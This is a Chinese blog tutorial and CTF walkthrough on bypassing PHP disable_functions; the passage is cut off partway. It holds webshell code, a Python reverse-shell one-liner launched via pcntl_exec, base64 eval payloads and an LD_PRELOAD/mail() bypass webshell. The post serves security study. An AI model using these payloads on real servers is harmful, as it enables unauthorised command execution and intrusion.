@@ -1,0 +1,818 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP disable_functionsdisable_functions是php.ini中的一个设置选项，相当于一个黑名单，可以用来设置PHP环境禁止某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数,如eval、exec、system等，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable_functions的设置中也通常较为严">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过disable_function">
+<meta property="og:url" content="http://example.com/2024/11/14/disable_function_bypass/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="PHP disable_functionsdisable_functions是php.ini中的一个设置选项，相当于一个黑名单，可以用来设置PHP环境禁止某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数,如eval、exec、system等，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable_functions的设置中也通常较为严">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/42D753E40D834b9eB16A5A49E20DD25F.png">
+<meta property="og:image" content="http://example.com/images/C9BBA94BC6B24c64B95C8E89EA63719A.png">
+<meta property="og:image" content="http://example.com/images/C6E9A0F6C4BD4f98883B0B652C7F2C99.png">
+<meta property="og:image" content="http://example.com/images/3D909CBBDDAF48b9BDF1F8B940A3F901.png">
+<meta property="og:image" content="http://example.com/images/3952C57190F448668883331C8FDEB735.png">
+<meta property="og:image" content="http://example.com/images/C7FF9CEE9EA14474B7CF5002637D395B.png">
+<meta property="og:image" content="http://example.com/images/92665A08A1F34df1A8B9EF063360FF99.png">
+<meta property="og:image" content="http://example.com/images/F92BA171306D421d98E77916CDB8E282.png">
+<meta property="og:image" content="http://example.com/images/0BF7522275F741829AC90DB0A18A60C9.png">
+<meta property="og:image" content="http://example.com/images/8EF3B810658047e5AB52E2B511DC6993.png">
+<meta property="og:image" content="http://example.com/images/AEEC7AAF6C014f01B805FCE1B83B4C5C.png">
+<meta property="og:image" content="http://example.com/images/1A47A6C3B0D045429D7A6641C757FBD1.png">
+<meta property="article:published_time" content="2024-11-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-18T08:16:58.331Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/42D753E40D834b9eB16A5A49E20DD25F.png">
+  
+  
+  
+  <title>绕过disable_function - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="绕过disable_function"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-14 00:00" pubdate>
+          2024年11月14日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">绕过disable_function</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="PHP-disable-functions"><a href="#PHP-disable-functions" class="headerlink" title="PHP disable_functions"></a>PHP disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，相当于一个黑名单，可以用来设置PHP环境禁止某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数,如eval、exec、system等，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable_functions的设置中也通常较为严格。<br><img src="/images/42D753E40D834b9eB16A5A49E20DD25F.png" srcset="/img/loading.gif" lazyload></p>
+<p>当我们辛辛苦苦拿到的webshell无法执行系统命令<br><img src="/images/C9BBA94BC6B24c64B95C8E89EA63719A.png" srcset="/img/loading.gif" lazyload><br>就要考虑是disable_function的问题，查看phpinfo发现设置了disalbe_functions<br><img src="/images/C6E9A0F6C4BD4f98883B0B652C7F2C99.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="常规绕过-黑名单绕过"><a href="#常规绕过-黑名单绕过" class="headerlink" title="常规绕过(黑名单绕过)"></a>常规绕过(黑名单绕过)</h2><p>即便是通过disable functions限制危险函数，也可能会有限制不全的情况。如果运维人员安全意识不强或对PHP不甚了解的话，则很有可能忽略某些危险函数，常见的有以下几种</p>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$command</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>))&#123;        <br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-number">1024</span>);  <span class="hljs-comment">//fread($handle, 1024);</span><br>&#125;  <br><span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>));<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]))&#123;     <br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>); <span class="hljs-comment">//fgets($pipes[1],1024);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>还有一个比较常见的易被忽略的函数就是pcntl_exec</p>
+<h2 id="利用pcntl-exec"><a href="#利用pcntl-exec" class="headerlink" title="利用pcntl_exec"></a>利用pcntl_exec</h2><p><strong>使用条件：</strong><br><strong>PHP安装并启用了pcntl插件</strong><br>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p>
+<p>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。<br>利用pcntl_exec()执行test.sh</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_exec&#x27;</span>)) &#123;<br>   <span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/test.sh&quot;</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;pcntl extension is not support!&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php pcntl<span class="hljs-constructor">_exec(<span class="hljs-string">&quot;/usr/bin/python&quot;</span>,<span class="hljs-params">array</span>(&#x27;-<span class="hljs-params">c</span>&#x27;,&#x27;<span class="hljs-params">import</span> <span class="hljs-params">socket</span>,<span class="hljs-params">subprocess</span>,<span class="hljs-params">os</span>;<span class="hljs-params">s</span>=<span class="hljs-params">socket</span>.<span class="hljs-params">socket</span>(<span class="hljs-params">socket</span>.AF_INET,<span class="hljs-params">socket</span>.SOCK_STREAM,<span class="hljs-params">socket</span>.SOL_TCP)</span>;s.connect((<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">6666</span>));os.dup2(s.fileno<span class="hljs-literal">()</span>,<span class="hljs-number">0</span>);os.dup2(s.fileno<span class="hljs-literal">()</span>,<span class="hljs-number">1</span>);os.dup2(s.fileno<span class="hljs-literal">()</span>,<span class="hljs-number">2</span>);p=subprocess.call(<span class="hljs-literal">[&quot;<span class="hljs-operator">/</span><span class="hljs-identifier">bin</span><span class="hljs-operator">/</span><span class="hljs-identifier">bash</span>&quot;,&quot;-<span class="hljs-identifier">i</span>&quot;]</span>);&#x27;));<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="利用LD-PRELOAD环境变量"><a href="#利用LD-PRELOAD环境变量" class="headerlink" title="利用LD_PRELOAD环境变量"></a>利用LD_PRELOAD环境变量</h2><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接(Runtime linker)，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数(无需别人的源码)，而另一方面，我们也可以向别人的程序注入程序，从而达到特定的攻击目的。</p>
+<p>我们通过环境变量LD_PRELOAD劫持系统函数，可以达到不调用PHP的各种命令执行函数(system()、exec()等等)仍可执行系统命令的目的。</p>
+<p>想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点</p>
+<ul>
+<li>能够上传自己的.so文件</li>
+<li>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</li>
+<li>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</li>
+<li>貌似还需要系统支持c环境，这个不太确定</li>
+</ul>
+<p>一般而言，利用漏洞控制web启动新进程a.bin(即便进程名无法让我随意指定)，新进程a.bin内部调用系统函数b()，b()位于系统共享对象c.so中，所以系统为该进程加载共享对象c.so，想办法在加载c.so前优先加载可控的c_evil.so，c_evil.so内含与b()同名的恶意函数，由于c_evil.so优先级较高，所以，a.bin将调用到c_evil.so内的b()而非系统的c.so内b()，同时，c_evil.so可控，达到执行恶意代码的目的，基于这一思路，常见突破disable_functions限制执行操作系统命令的方式为：</p>
+<ul>
+<li><p>编写一个原型为uid_t getuid(void);的c函数，内部执行攻击者指定的代码，并编译成共享对象getuid_shadow.so</p>
+</li>
+<li><p>运行PHP函数putenv()(用来配置系统环境变量)，设定环境变量LD_PRELOAD为getuid_shadow.so，以便后续启动新进程时优先加载该共享对象;</p>
+</li>
+<li><p>运行PHP的mail()函数，mail()内部启动新进程&#x2F;usr&#x2F;sbin&#x2F;sendmail，由于上一步LD_PRELOAD的作用，sendmail调用的系统函数getuid()被优先级更好的getuid_shadow.so中的同名getuid()所劫持;以此来达到不调用PHP的各种命令执行函数(system()、exec()等)仍可以执行系统命令的目的。</p>
+</li>
+</ul>
+<p>之所以劫持getuid()，是因为sendmail程序会调用该函数(当然也可以为其它被调用的系统函数)，在真实环境中，存在两方面问题：</p>
+<ul>
+<li><p>一是：某些环境中，web禁止启用sendmail、甚至系统上根本未安装sendmail，也就谈不上劫持getuid()，通常的www-data权限又不可能去更改php.ini配置、去安装sendmail软件；</p>
+</li>
+<li><p>二是：即便目标可以启用sendmail，由于未将主机名(hostname输出)添加进hosts中，导致每次运行sendmail都要耗时半分钟等待域名解析超时返回，www-data也无法将主机名加入hosts(如，127.0.0.1 lamp、lamp、lamp.com)。</p>
+</li>
+</ul>
+<p>基于这两个原因，yangyangwithgnu大佬找到一个方式，在加载时就执行代码(拦截启动进程)，而不用考虑劫持某一系统函数，那我就完全可以不依赖sendmail了，详情参见<br><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>下面，我们通过[GKCTF2020]CheckIN 这道题来演示利用LD_PRELOAD来突破disable_functions的具体方法</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Check_In<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassName</span></span></span><br><span class="hljs-class"><span class="language-php"></span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-literal">null</span>;</span><br><span class="language-php">        <span class="hljs-keyword">public</span> <span class="hljs-variable">$decode</span> = <span class="hljs-literal">null</span>;</span><br><span class="language-php">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">        </span>&#123;</span><br><span class="language-php">                <span class="hljs-variable language_">$this</span>-&gt;code = @<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">x</span>()[<span class="hljs-string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="language-php">                <span class="hljs-variable language_">$this</span>-&gt;decode = @<span class="hljs-title function_ invoke__">base64_decode</span>( <span class="hljs-variable">$this</span>-&gt;code );</span><br><span class="language-php">                @<span class="hljs-title function_ invoke__">Eval</span>(<span class="hljs-variable">$this</span>-&gt;decode);</span><br><span class="language-php">        &#125;</span><br><span class="language-php"></span><br><span class="language-php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">        </span>&#123;</span><br><span class="language-php">                <span class="hljs-keyword">return</span> <span class="hljs-variable">$_REQUEST</span>;</span><br><span class="language-php">        &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassName</span>();</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/3D909CBBDDAF48b9BDF1F8B940A3F901.png" srcset="/img/loading.gif" lazyload><br>构造如下拿到shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/?Ginkgo=ZXZhbCgkX1BPU1Rbd2hvYW1pXSk7<br><span class="hljs-meta prompt_"># </span><span class="language-bash">即<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-built_in">whoami</span>]);</span> <br></code></pre></td></tr></table></figure>
+<p>但是无法执行命令<br><img src="/images/3952C57190F448668883331C8FDEB735.png" srcset="/img/loading.gif" lazyload><br>怀疑是设置了disable_functions，查看phpinfo发现设置了disalbe_functions</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">Ginkgo</span>=cGhwaW5mbygpOw==<br><span class="hljs-comment"># 即phpinfo();</span><br></code></pre></td></tr></table></figure>
+<p>发现确实设置了disable_functions<br><img src="/images/C7FF9CEE9EA14474B7CF5002637D395B.png" srcset="/img/loading.gif" lazyload><br>下面尝试绕过<br>需要去yangyangwithgnu大佬的github上下载该项目的利用文件<br><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>本题中有这几个关键文件<br><img src="/images/92665A08A1F34df1A8B9EF063360FF99.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>bypass_disablefunc.php：一个用来执行命令的webshell</li>
+<li>bypass_disablefunc_x64.so或x86.so：执行命令的共享对象文件，分为64位的和32位的。</li>
+<li>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</li>
+</ul>
+<p>首先分析bypass_disablefunc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br><br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br><br>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>; <br><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用GET方法提供三个参数：</p>
+<ul>
+<li>cmd命令：待执行的系统命令，如id命令。</li>
